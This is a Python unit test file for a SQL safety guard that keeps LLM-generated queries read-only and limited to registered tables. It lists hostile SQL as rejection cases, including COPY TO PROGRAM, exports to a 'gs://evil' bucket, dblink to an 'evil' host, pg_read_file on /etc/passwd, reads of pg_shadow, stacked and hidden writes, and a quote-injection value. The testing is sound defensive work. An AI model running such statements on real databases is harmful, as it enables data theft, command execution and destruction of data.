# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Unit regression tests for the deterministic SQL policy check.

LLM-generated SQL used to reach the database guarded only by prompt instructions. These
tests cover the policy itself (utilities/sql_guard.py, which needs sqlglot) and the three
places that enforce it: the debugger's dry run, the SQL returned by generate_sql, and
get_results right before execution.
"""

import asyncio
import importlib.util
import logging
import os
import sys
import types
import unittest
from unittest import mock

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

try:
    import sqlglot  # noqa: F401
    HAVE_SQLGLOT = True
except ImportError:
    HAVE_SQLGLOT = False


def _load(module_name, relative_path, fakes=None):
    spec = importlib.util.spec_from_file_location(module_name, os.path.join(REPO_ROOT, *relative_path))
    module = importlib.util.module_from_spec(spec)
    with mock.patch.dict(sys.modules, fakes or {}):
        spec.loader.exec_module(module)
    return module


# --------------------------------------------------------------------------------------
# The policy: utilities/sql_guard.py
# --------------------------------------------------------------------------------------
PG_TABLES = {("sales", "orders"), ("sales", "customers"), ("Sales", "MixedCase")}
BQ_TABLES = {("census", "midyear_population"), ("census", "country_names_area")}


@unittest.skipUnless(HAVE_SQLGLOT, "sqlglot is required for the SQL policy tests (pip install sqlglot)")
class TestSqlPolicy(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        logging.getLogger("sqlglot").setLevel(logging.ERROR)
        cls.guard = _load("sql_guard_under_test", ("utilities", "sql_guard.py"))

    def assertAllowed(self, sql, source_type, tables):
        allowed, reason = self.guard.check_read_only_query(sql, source_type, tables)
        self.assertTrue(allowed, f"expected {sql!r} to be allowed, got: {reason}")
        self.assertEqual(reason, "")

    def assertRejected(self, sql, source_type, tables):
        allowed, reason = self.guard.check_read_only_query(sql, source_type, tables)
        self.assertFalse(allowed, f"expected {sql!r} to be rejected")
        self.assertTrue(reason)
        return reason

    def test_postgres_allows_read_only_queries_on_registered_tables(self):
        for sql in [
            "SELECT * FROM sales.orders",
            "select o.id from Sales.Orders o join sales.customers c on c.id = o.customer_id "
            "where o.total > 10 order by 1 limit 5;",
            "WITH big AS (SELECT * FROM sales.orders WHERE total > 100), "
            "top AS (SELECT * FROM big LIMIT 3) SELECT * FROM top",
            "WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r WHERE n < 3) "
            "SELECT r.n, o.id FROM r JOIN sales.orders o ON o.id = r.n",
            "SELECT id FROM sales.orders UNION ALL SELECT id FROM sales.customers",
            "(WITH a AS (SELECT id FROM sales.orders) SELECT id FROM a)",
            "SELECT g FROM generate_series(1, 3) AS g",
            'SELECT * FROM "Sales"."MixedCase"',
            "SELECT date_trunc('month', created_at)::date AS m, sum(total) FROM sales.orders GROUP BY 1",
            "SELECT id\r\nFROM sales.orders\r\n",
            "SELECT id FROM sales.orders WHERE note = 'caf\u00e9'",
        ]:
            with self.subTest(sql=sql):
                self.assertAllowed(sql, "postgres", PG_TABLES)

    def test_bigquery_allows_read_only_queries_on_registered_tables(self):
        for sql in [
            "SELECT country_name FROM census.midyear_population WHERE year = 2022 ORDER BY 1 LIMIT 1",
            "SELECT * FROM `my-project.census.midyear_population`",
            "SELECT * FROM `my-project`.`census`.`midyear_population` AS p "
            "JOIN `census.country_names_area` a USING (country_code)",
            "WITH t AS (SELECT * FROM census.midyear_population) SELECT COUNT(*) FROM t",
            "SELECT x FROM census.midyear_population p, UNNEST([1, 2, 3]) AS x",
        ]:
            with self.subTest(sql=sql):
                self.assertAllowed(sql, "bigquery", BQ_TABLES)

    def test_rejects_statements_that_are_not_a_select(self):
        for sql in [
            "DELETE FROM sales.orders",
            "UPDATE sales.orders SET total = 0",
            "INSERT INTO sales.orders VALUES (1)",
            "DROP TABLE sales.orders",
            "TRUNCATE sales.orders",
            "CREATE TABLE sales.x AS SELECT * FROM sales.orders",
            "GRANT ALL ON sales.orders TO public",
            "COPY sales.orders TO PROGRAM 'id'",
            "COPY (SELECT * FROM sales.orders) TO '/tmp/x'",
            "VACUUM sales.orders",
            "DO $$ BEGIN DELETE FROM sales.orders; END $$",
            "EXPLAIN ANALYZE DELETE FROM sales.orders",
            "SET search_path = hr",
            "CALL some_proc()",
            "VALUES (1)",
            "this is not sql at all",
            "SELECT * FROM",
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "postgres", PG_TABLES)
        for sql in [
            "DELETE FROM census.midyear_population WHERE true",
            "CREATE OR REPLACE TABLE census.x AS SELECT 1",
            "EXPORT DATA OPTIONS(uri='gs://evil/*.csv', format='CSV') AS SELECT * FROM census.midyear_population",
            "MERGE census.midyear_population t USING census.country_names_area s ON FALSE "
            "WHEN NOT MATCHED THEN INSERT ROW",
            "DECLARE x INT64",
            "CALL census.proc()",
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "bigquery", BQ_TABLES)

    def test_rejects_writes_hidden_inside_a_select(self):
        for sql in [
            "WITH d AS (DELETE FROM sales.orders RETURNING *) SELECT * FROM d",
            "WITH u AS (UPDATE sales.orders SET total = 0 RETURNING *) SELECT * FROM u",
            "SELECT * INTO sales.copy FROM sales.orders",
            "SELECT * FROM sales.orders FOR UPDATE",
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "postgres", PG_TABLES)

    def test_rejects_more_than_one_statement(self):
        for sql in [
            "SELECT 1; DELETE FROM sales.orders",
            "SELECT 1; COMMIT; DELETE FROM sales.orders",
            "SELECT * FROM sales.orders; -- trailing",
            "SELECT $$a$$; DELETE FROM sales.orders",
        ]:
            with self.subTest(sql=sql):
                self.assertIn("single SQL statement", self.assertRejected(sql, "postgres", PG_TABLES))
        self.assertRejected("SELECT 1; DROP TABLE census.midyear_population", "bigquery", BQ_TABLES)

    def test_rejects_tables_outside_the_data_source(self):
        for sql in [
            "SELECT * FROM hr.salaries",
            "SELECT * FROM pg_catalog.pg_shadow",
            "SELECT * FROM information_schema.tables",
            "SELECT * FROM other_db.hr.salaries",
            "SELECT * FROM sales.orders o JOIN hr.salaries s ON true",
            "SELECT (SELECT max(salary) FROM hr.salaries) FROM sales.orders",
            "SELECT * FROM sales.orders WHERE EXISTS (SELECT 1 FROM hr.salaries)",
            "SELECT note FROM sales.orders UNION SELECT secret FROM hr.salaries",
            "SELECT * FROM (SELECT * FROM hr.salaries) q",
            "SELECT * FROM sales.orders, LATERAL (SELECT * FROM hr.salaries) s",
            "TABLE hr.salaries",
            "SELECT 1 FROM sales.orders ORDER BY (SELECT count(*) FROM hr.salaries)",
            'SELECT * FROM "SALES"."ORDERS"',
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "postgres", PG_TABLES)
        for sql in [
            "SELECT * FROM `victim-project.hr.salaries`",
            "SELECT * FROM hr.salaries",
            "SELECT * FROM census.INFORMATION_SCHEMA.TABLES",
            "SELECT * FROM `region-us`.INFORMATION_SCHEMA.JOBS",
            "SELECT * FROM `census.midyear_*`",
            "SELECT * FROM census.Midyear_Population",
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "bigquery", BQ_TABLES)

    def test_requires_schema_qualified_table_names(self):
        # Unqualified names resolve through the search path, pg_catalog first.
        for sql in ["SELECT * FROM orders", "SELECT * FROM pg_shadow"]:
            with self.subTest(sql=sql):
                self.assertIn("schema or dataset", self.assertRejected(sql, "postgres", PG_TABLES))
        self.assertRejected("SELECT * FROM midyear_population", "bigquery", BQ_TABLES)

    def test_cte_names_cannot_mask_real_tables(self):
        for sql in [
            # A CTE declared in a nested query is not visible outside it.
            "SELECT * FROM pg_shadow WHERE EXISTS (WITH pg_shadow AS (SELECT 1) SELECT 1 FROM pg_shadow)",
            # Without RECURSIVE a CTE cannot see a later CTE, nor itself.
            "WITH a AS (SELECT * FROM pg_shadow), pg_shadow AS (SELECT 1) SELECT * FROM a",
            "WITH pg_shadow AS (SELECT * FROM pg_shadow) SELECT * FROM pg_shadow",
            # Quoted names are case sensitive in PostgreSQL.
            'WITH "PG_SHADOW" AS (SELECT 1) SELECT * FROM pg_shadow',
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "postgres", PG_TABLES)

    def test_rejects_table_functions(self):
        for sql in [
            "SELECT * FROM dblink('host=evil', 'select 1') AS t(a int)",
            "SELECT * FROM ROWS FROM (pg_ls_dir('.')) AS t(x)",
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "postgres", PG_TABLES)
        for sql in [
            "SELECT * FROM EXTERNAL_QUERY('conn', 'DELETE FROM x')",
            "SELECT * FROM ML.PREDICT(MODEL `census.m`, TABLE census.midyear_population)",
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "bigquery", BQ_TABLES)

    def test_rejects_postgres_functions_with_side_effects(self):
        for sql in [
            "SELECT pg_sleep(100) FROM sales.orders",
            "SELECT pg_catalog.pg_sleep(100)",
            'SELECT "pg_sleep"(100)',
            "SELECT nextval('s') FROM sales.orders",
            "SELECT set_config('search_path', 'hr', false)",
            "SELECT lo_import('/etc/passwd')",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT query_to_xml('delete from sales.orders', true, true, '')",
            "SELECT * FROM sales.orders ORDER BY (SELECT pg_sleep(5))",
        ]:
            with self.subTest(sql=sql):
                self.assertIn("not permitted", self.assertRejected(sql, "postgres", PG_TABLES))

    def test_rejects_text_the_parser_and_engine_may_read_differently(self):
        for sql in [
            'SELECT U&"pg\\005fsleep"(100)',          # Unicode-escaped identifier for pg_sleep
            "SELECT u&'\\0061' FROM sales.orders",
            "SELECT id -- comment\rFROM sales.orders",  # a bare CR ends a comment in PostgreSQL
            "SELECT id\x0cFROM sales.orders",
            "SELECT id\u00a0FROM sales.orders",
            "SELECT id FROM sales.orders WHERE note = 'x\u200by'",
            "SELECT id FROM sales.orders\x00",
        ]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "postgres", PG_TABLES)

    def test_rejects_when_input_or_table_list_is_unusable(self):
        for sql in [None, "", "   ", ";", 42]:
            with self.subTest(sql=sql):
                self.assertRejected(sql, "postgres", PG_TABLES)
        for tables in [set(), None, []]:
            with self.subTest(tables=tables):
                self.assertRejected("SELECT * FROM sales.orders", "postgres", tables)

    def test_unknown_source_type_is_treated_as_postgres(self):
        self.assertAllowed("SELECT * FROM Sales.Orders", "cloudsql-pg", PG_TABLES)
        self.assertRejected("SELECT pg_sleep(1)", "cloudsql-pg", PG_TABLES)


# --------------------------------------------------------------------------------------
# Enforcement in opendataqna.py
# --------------------------------------------------------------------------------------
def _load_pipeline():
    fake_utilities = types.ModuleType("utilities")
    fake_utilities.PROJECT_ID = "test-project"
    fake_utilities.PG_REGION = "us-central1"
    fake_utilities.BQ_REGION = "us"
    fake_utilities.EXAMPLES = ""
    fake_utilities.LOGGING = False
    fake_utilities.VECTOR_STORE = "bigquery-vector"
    fake_utilities.BQ_OPENDATAQNA_DATASET_NAME = "opendataqna_ds"
    fake_utilities.USE_SESSION_HISTORY = False

    fake_dbconnectors = types.ModuleType("dbconnectors")
    fake_dbconnectors.__path__ = []
    fake_dbconnectors.bqconnector = mock.MagicMock()
    fake_dbconnectors.pgconnector = mock.MagicMock()
    fake_dbconnectors.firestoreconnector = mock.MagicMock()

    fake_store_embeddings = types.ModuleType("embeddings.store_embeddings")
    fake_store_embeddings.add_sql_embedding = mock.AsyncMock()
    fake_embeddings = types.ModuleType("embeddings")
    fake_embeddings.__path__ = []
    fake_embeddings.store_embeddings = fake_store_embeddings

    module = _load(
        "opendataqna_sql_guard_under_test",
        ("opendataqna.py",),
        {
            "google": mock.MagicMock(),
            "google.cloud": mock.MagicMock(),
            "google.cloud.bigquery": mock.MagicMock(),
            "agents": mock.MagicMock(),
            "utilities": fake_utilities,
            "dbconnectors": fake_dbconnectors,
            "embeddings": fake_embeddings,
            "embeddings.store_embeddings": fake_store_embeddings,
        },
    )
    return module, fake_dbconnectors


pipeline_mod, fake_connectors = _load_pipeline()


def _fake_policy(sql, source_type, authorized_tables):
    """Stands in for the real policy so these wiring tests do not need sqlglot."""
    if "DELETE" in sql.upper():
        return False, "Only read-only SELECT queries are permitted."
    return True, ""


class TestAuthorizedTables(unittest.TestCase):
    def setUp(self):
        fake_connectors.bqconnector.reset_mock()
        fake_connectors.bqconnector.retrieve_df.side_effect = None

    def test_returns_the_tables_registered_for_the_grouping(self):
        fake_connectors.bqconnector.retrieve_df.return_value = {
            "table_schema": ["sales", "sales"], "table_name": ["orders", "customers"]}

        tables, invalid = pipeline_mod.get_authorized_tables("sales_group")

        self.assertFalse(invalid)
        self.assertEqual(tables, {("sales", "orders"), ("sales", "customers")})
        sql = fake_connectors.bqconnector.retrieve_df.call_args.args[0]
        self.assertIn("@user_grouping", sql)
        self.assertNotIn("sales_group", sql)

    def test_fails_closed(self):
        cases = {
            "no rows": {"table_schema": [], "table_name": []},
            "error frame": {"Error. Message": ["boom"]},
        }
        for label, frame in cases.items():
            with self.subTest(label):
                fake_connectors.bqconnector.retrieve_df.return_value = frame
                self.assertEqual(pipeline_mod.get_authorized_tables("sales_group"), (set(), True))
        fake_connectors.bqconnector.retrieve_df.side_effect = RuntimeError("vector store down")
        self.assertEqual(pipeline_mod.get_authorized_tables("sales_group"), (set(), True))

    def test_rejects_malformed_grouping_without_querying(self):
        fake_connectors.bqconnector.retrieve_df.reset_mock()
        self.assertEqual(pipeline_mod.get_authorized_tables("x' OR '1'='1"), (set(), True))
        fake_connectors.bqconnector.retrieve_df.assert_not_called()


class TestCheckGeneratedSql(unittest.TestCase):
    def test_fails_closed_when_the_policy_cannot_be_loaded(self):
        with mock.patch.dict(sys.modules, {"utilities": None, "utilities.sql_guard": None}):
            allowed, reason = pipeline_mod.check_generated_sql(
                "SELECT * FROM sales.orders", "postgres", {("sales", "orders")})
        self.assertFalse(allowed)
        self.assertTrue(reason)

    def test_fails_closed_when_the_policy_raises(self):
        broken = types.ModuleType("utilities.sql_guard")
        broken.check_read_only_query = mock.MagicMock(side_effect=RuntimeError("bug"))
        package = types.ModuleType("utilities")
        package.__path__ = []
        with mock.patch.dict(sys.modules, {"utilities": package, "utilities.sql_guard": broken}):
            allowed, _ = pipeline_mod.check_generated_sql("SELECT 1", "postgres", {("s", "t")})
        self.assertFalse(allowed)


class TestGetResultsEnforcesPolicy(unittest.TestCase):
    def setUp(self):
        fake_connectors.pgconnector.reset_mock()
        patches = [
            mock.patch.object(pipeline_mod, "get_source_type", return_value=("postgres", False)),
            mock.patch.object(pipeline_mod, "get_authorized_tables",
                              return_value=({("sales", "orders")}, False)),
            mock.patch.object(pipeline_mod, "check_generated_sql", side_effect=_fake_policy),
        ]
        self.get_source_type, self.get_authorized_tables, self.check = [p.start() for p in patches]
        for p in patches:
            self.addCleanup(p.stop)

    def test_rejected_sql_is_never_executed(self):
        result, invalid = pipeline_mod.get_results("sales_group", "DELETE FROM sales.orders")

        self.assertTrue(invalid)
        self.assertIn("Query rejected", result)
        fake_connectors.pgconnector.retrieve_df.assert_not_called()

    def test_allowed_sql_is_executed_exactly_as_checked(self):
        fake_connectors.pgconnector.retrieve_df.return_value = "rows"

        result, invalid = pipeline_mod.get_results("sales_group", "```sql\nSELECT * FROM sales.orders\n```")

        self.assertFalse(invalid)
        self.assertEqual(result, "rows")
        checked_sql, source_type, tables = self.check.call_args.args
        self.assertEqual(checked_sql, "\nSELECT * FROM sales.orders\n")
        self.assertEqual(source_type, "postgres")
        self.assertEqual(tables, {("sales", "orders")})
        fake_connectors.pgconnector.retrieve_df.assert_called_once_with(checked_sql)


class TestGenerateSqlEnforcesPolicy(unittest.TestCase):
    SETTINGS = (2, False, "vertex", "m", "m", "m", 5, 10, 0.3, 0.3, 0.3, 3)

    def _generate(self, built_sql, run_debugger=False, debugger=None):
        builder = mock.MagicMock()
        builder.build_sql.return_value = built_sql
        fake_connectors.bqconnector.getSimilarMatches.return_value = "Schema(values): sales.orders"
        with mock.patch.object(pipeline_mod, "BuildSQLAgent", return_value=builder), \
                mock.patch.object(pipeline_mod, "DebugSQLAgent", return_value=debugger or mock.MagicMock()), \
                mock.patch.object(pipeline_mod, "get_source_type", return_value=("postgres", False)), \
                mock.patch.object(pipeline_mod, "get_authorized_tables",
                                  return_value=({("sales", "orders")}, False)), \
                mock.patch.object(pipeline_mod, "check_generated_sql", side_effect=_fake_policy):
            return asyncio.run(pipeline_mod.generate_sql(
                "session", "question", "sales_group", run_debugger, *self.SETTINGS))

    def test_rejected_sql_is_not_returned(self):
        final_sql, _, invalid = self._generate("DELETE FROM sales.orders")

        self.assertTrue(invalid)
        self.assertNotIn("DELETE FROM", final_sql)
        self.assertIn("rejected by the SQL safety policy", final_sql)

    def test_allowed_sql_is_returned(self):
        final_sql, _, invalid = self._generate("SELECT * FROM sales.orders")

        self.assertFalse(invalid)
        self.assertEqual(final_sql, "SELECT * FROM sales.orders")

    def test_debugger_receives_the_policy_check(self):
        verdicts = {}

        def fake_start_debugger(*args, sql_guard=None, **kwargs):
            verdicts["delete"] = sql_guard("DELETE FROM sales.orders")
            verdicts["select"] = sql_guard("SELECT * FROM sales.orders")
            return "SELECT * FROM sales.orders", False, "audit"

        debugger = mock.MagicMock()
        debugger.start_debugger.side_effect = fake_start_debugger

        self._generate("SELECT * FROM sales.orders", run_debugger=True, debugger=debugger)

        self.assertFalse(verdicts["delete"][0])
        self.assertEqual(verdicts["select"], (True, ""))


# --------------------------------------------------------------------------------------
# Enforcement in agents/DebugSQLAgent.py
# --------------------------------------------------------------------------------------
def _load_debug_agent():
    package = types.ModuleType("agents_sql_guard_under_test")
    package.__path__ = []
    core = types.ModuleType("agents_sql_guard_under_test.core")
    core.Agent = type("Agent", (), {})

    fake_dbconnectors = types.ModuleType("dbconnectors")
    fake_dbconnectors.__path__ = []
    fake_dbconnectors.pgconnector = mock.MagicMock()
    fake_dbconnectors.bqconnector = mock.MagicMock()

    fakes = {
        "agents_sql_guard_under_test": package,
        "agents_sql_guard_under_test.core": core,
        "vertexai": mock.MagicMock(),
        "vertexai.language_models": mock.MagicMock(),
        "vertexai.generative_models": mock.MagicMock(),
        "google": mock.MagicMock(),
        "google.cloud": mock.MagicMock(),
        "google.cloud.aiplatform": mock.MagicMock(),
        "dbconnectors": fake_dbconnectors,
        "utilities": mock.MagicMock(),
        "pandas": mock.MagicMock(),
    }
    module = _load("agents_sql_guard_under_test.DebugSQLAgent", ("agents", "DebugSQLAgent.py"), fakes)
    return module, fake_dbconnectors


debug_mod, debug_connectors = _load_debug_agent()


class TestDebuggerChecksPolicyBeforeDryRun(unittest.TestCase):
    def setUp(self):
        debug_connectors.pgconnector.reset_mock()
        debug_connectors.pgconnector.test_sql_plan_execution.return_value = (True, "plan")
        self.agent = object.__new__(debug_mod.DebugSQLAgent)
        self.agent.init_chat = mock.MagicMock(return_value="chat")
        self.agent.rewrite_sql_chat = mock.MagicMock(return_value="SELECT * FROM sales.orders")

    def _debug(self, sql, sql_guard):
        return self.agent.start_debugger(
            "postgres", "sales_group", sql, "question", mock.MagicMock(), "tables", "columns", "audit",
            DEBUGGING_ROUNDS=2, LLM_VALIDATION=False, sql_guard=sql_guard)

    def test_rejected_candidate_is_rewritten_without_touching_the_database(self):
        final_sql, invalid, _ = self._debug("DELETE FROM sales.orders", lambda sql: _fake_policy(sql, None, None))

        self.assertFalse(invalid)
        self.assertEqual(final_sql, "SELECT * FROM sales.orders")
        debug_connectors.pgconnector.test_sql_plan_execution.assert_called_once_with("SELECT * FROM sales.orders")
        feedback = self.agent.rewrite_sql_chat.call_args.args[3]
        self.assertIn("rejected by the SQL safety policy", feedback)

    def test_candidate_that_stays_rejected_never_reaches_the_database(self):
        self.agent.rewrite_sql_chat.return_value = "DELETE FROM sales.orders WHERE 1=1"

        _, invalid, _ = self._debug("DELETE FROM sales.orders", lambda sql: _fake_policy(sql, None, None))

        self.assertTrue(invalid)
        debug_connectors.pgconnector.test_sql_plan_execution.assert_not_called()

    def test_without_a_policy_the_debugger_behaves_as_before(self):
        final_sql, invalid, _ = self._debug("SELECT * FROM sales.orders", None)

        self.assertFalse(invalid)
        debug_connectors.pgconnector.test_sql_plan_execution.assert_called_once_with("SELECT * FROM sales.orders")


if __name__ == "__main__":
    unittest.main()
